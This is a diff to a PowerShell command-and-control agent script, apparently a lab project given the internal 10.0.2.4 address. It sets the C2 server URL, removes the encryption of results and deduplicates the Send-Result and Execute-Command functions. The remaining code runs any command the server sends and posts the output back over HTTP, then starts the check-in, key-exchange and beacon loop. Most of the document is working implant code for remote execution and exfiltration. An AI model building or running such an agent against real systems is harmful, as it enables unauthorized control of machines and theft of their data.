@@ -9,7 +9,7 @@
 #########################################################################################################################################################################################################################
 
 # Configuration
-$server_url = "http://C2_Server_IP_or_URL:8080"
+$server_url = "http://10.0.2.4:8080"
 $results_url = "$server_url/result"
 Write-Host "Results URL: $results_url"
 $sovereign_folder = "C:\sovereign"
@@ -171,11 +171,8 @@ function Execute-Command {
         return
     }
 
-    # Encrypt the result
-    $encrypted_result = Encrypt-Data -data $output
-
-    # Send the result
-    Send-Result -AgentID $agent_id -Command $command -Output $encrypted_result
+    # Send the result without encryption
+    Send-Result -AgentID $agent_id -Command $command -Output $output
 }
 
 function Send-Result {
@@ -185,9 +182,6 @@ function Send-Result {
         [string]$Output
     )
 
-    # Encrypt the result before sending
-    $EncryptedResult = Encrypt-Data -data $Output
-
     # Define the results URL (keeping `/result` as per your agent config)
     $ResultsURL = "$server_url/result"
 
@@ -195,49 +189,11 @@ function Send-Result {
     $Payload = @{
         AgentID = $AgentID
         Command = $Command
-        Result  = $EncryptedResult
+        Result  = $Output
     } | ConvertTo-Json -Depth 2
 
     try {
-        # Send the encrypted result to the server
-        $ResultResponse = Invoke-RestMethod -Uri $ResultsURL -Method Post -Body $Payload -ContentType "application/json"
-        Log-Message "Result Sent: $($ResultResponse.Status)"
-    } catch {
-        Log-Message "Error sending result: $_"
-    }
-}
-
-function Send-Result {
-    param (
-        [string]$AgentID,
-        [string]$Command,
-        [string]$Output
-    )
-
-    # Debugging: Check if $ResultsURL is set correctly
-    Write-Host "Sending result to: $ResultsURL"
-
-    # Debugging: Check if $AgentID exists
-    Write-Host "Agent ID: $AgentID"
-
-    # Encrypt the result before sending
-    $EncryptedResult = Encrypt-Data -data $Output
-
-    # Define the results URL (keeping `/result` as per your agent config)
-    $ResultsURL = "$server_url/result"
-
-    # Prepare the payload
-    $Payload = @{
-        AgentID = $AgentID
-        Command = $Command
-        Result  = $EncryptedResult
-    } | ConvertTo-Json -Depth 2
-
-    # Debugging: Verify the JSON payload
-    Write-Host "Payload: $Payload"
-
-    try {
-        # Send the encrypted result to the server
+        # Send the result to the server
         $ResultResponse = Invoke-RestMethod -Uri $ResultsURL -Method Post -Body $Payload -ContentType "application/json"
         Log-Message "Result Sent: $($ResultResponse.Status)"
     } catch {
@@ -275,58 +231,7 @@ function MainLoop {
     }
 }
 
-# Execute command received from the server
-function Execute-Command {
-    param (
-        [string]$command
-    )
-    try {
-        $output = & $command 2>&1
-        Log-Message "Command Output: $output"
-    } catch {
-        Log-Message "Command execution error: $_"
-        return
-    }
-
-    # Encrypt the result
-    $encrypted_result = Encrypt-Data -data $output
-
-    # Send the result
-    Send-Result -AgentID $agent_id -Command $command -Output $encrypted_result
-}
-
-# Send the result to the server
-function Send-Result {
-    param (
-        [string]$AgentID,
-        [string]$Command,
-        [string]$Output
-    )
-
-    # Encrypt the result before sending
-    $EncryptedResult = Encrypt-Data -data $Output
-
-    # Define the results URL (keeping `/result` as per your agent config)
-    $ResultsURL = "$server_url/result"
-
-    # Prepare the payload
-    $Payload = @{
-        AgentID = $AgentID
-        Command = $Command
-        Result  = $EncryptedResult
-    } | ConvertTo-Json -Depth 2
-
-    try {
-        # Send the encrypted result to the server
-        $ResultResponse = Invoke-RestMethod -Uri $ResultsURL -Method Post -Body $Payload -ContentType "application/json"
-        Log-Message "Result Sent: $($ResultResponse.Status)"
-    } catch {
-        Log-Message "Error sending result: $_"
-    }
-}
-
 # Main script execution
 Checkin
 ExchangeKey
 MainLoop
-
